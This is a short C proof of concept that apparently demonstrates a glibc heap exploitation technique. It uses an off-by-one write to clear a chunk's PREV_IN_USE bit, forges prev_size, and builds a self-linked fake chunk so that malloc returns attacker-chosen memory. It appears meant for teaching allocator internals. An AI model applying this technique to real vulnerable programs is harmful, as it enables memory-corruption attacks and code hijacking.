#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[32];               // padding
};

int main() {
  struct chunk_structure *chunk1, fake_chunk;
  size_t allotedSize;
  unsigned long long *ptr1, *ptr2;
  char *ptr;
  void *victim;

  printf("%p\n", &fake_chunk);

  // Allocate any chunk
  ptr1 = malloc(40);
  printf("%p\n", ptr1);

  // Allocate another chunk
  ptr2 = malloc(0xf8);
  printf("%p\n", ptr2);

  chunk1 = (struct chunk_structure *)(ptr1 - 2);
  allotedSize = chunk1->size & ~(0x1 | 0x2 | 0x4);
  allotedSize -= sizeof(size_t);      // Heap meta data for 'prev_size' of chunk1

  // Attacker initiates a heap overflow
  // Off by one overflow of ptr1, overflows into ptr2's 'size'
  ptr = (char *)ptr1;
  ptr[allotedSize] = 0;      // Zeroes out the PREV_IN_USE bit

  // Fake chunk
  fake_chunk.size = 0x100;    // enough size to service the malloc request
  // These two will ensure that unlink security checks pass
  // i.e. P->fd->bk == P and P->bk->fd == P
  fake_chunk.fd = &fake_chunk;
  fake_chunk.bk = &fake_chunk;

  // Overwrite ptr2's prev_size so that ptr2's chunk - prev_size points to our fake chunk
  // This falls within the bounds of ptr1's chunk - no need to overflow
  *(size_t *)&ptr[allotedSize-sizeof(size_t)] =
                                  (size_t)&ptr[allotedSize - sizeof(size_t)]  // ptr2's chunk
                                  - (size_t)&fake_chunk;

  // Free the second chunk. It will detect the previous chunk in memory as free and try
  // to merge with it. Now, top chunk will point to fake_chunk
  free(ptr2);

  victim = malloc(40);

  printf("%p\n", victim);

  return 0;
}